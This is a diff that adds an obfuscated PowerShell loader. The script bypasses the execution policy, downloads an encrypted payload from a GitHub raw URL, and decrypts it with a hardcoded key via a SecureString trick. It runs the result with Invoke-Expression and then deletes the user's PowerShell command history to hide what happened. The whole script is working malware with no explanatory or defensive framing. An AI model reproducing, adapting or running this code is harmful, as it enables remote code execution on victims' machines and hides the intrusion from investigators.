@@ -1,0 +1,54 @@
+$sfdvihfgn = "isdguvsvhsifyhsdvn"
+
+Function DecodeString
+{
+	[CmdletBinding()] Param (
+		[Parameter(Position = 0, ValueFromPipeline = $True)]
+		[ValidateNotNullOrEmpty()]
+		[String]
+		$obfString,
+		
+		[Parameter(Position = 1)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Key		
+    )
+	
+	$segsd = [System.Convert]::FromBase64String($Key)
+		
+	$werfg = (New-Object  Management.Automation.PSCredential ' ', ($obfString |ConvertTo-SecureString -Key  $segsd)).GetNetworkCredential().Password
+
+	return $werfg
+}
+
+$rfvwd = "http://raw.githubusercontent.com/toyisatty/bazz/refs/heads/main/"
+$tid = "db"
+
+
+function getinfo
+{
+	$Key = "wQIGLsIS9c6YgZ8zU6JPs6oX/8WbCaVo"
+	$endtag = "1.txt"
+	$downpsurl = $rfvwd + $endtag
+	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
+	$comletter = DecodeString -obfString $codestring -Key $Key
+	
+	$result = Invoke-Expression $comletter	
+}
+
+function wegvsdeg
+{
+	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+
+	getinfo
+	$aqwrfszva = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+	$fffd = Test-Path $aqwrfszva
+	if($fffd -eq $True)
+	{
+		Remove-Item -path $aqwrfszva -Recurse
+	}
+	
+}
+wegvsdeg
+
+
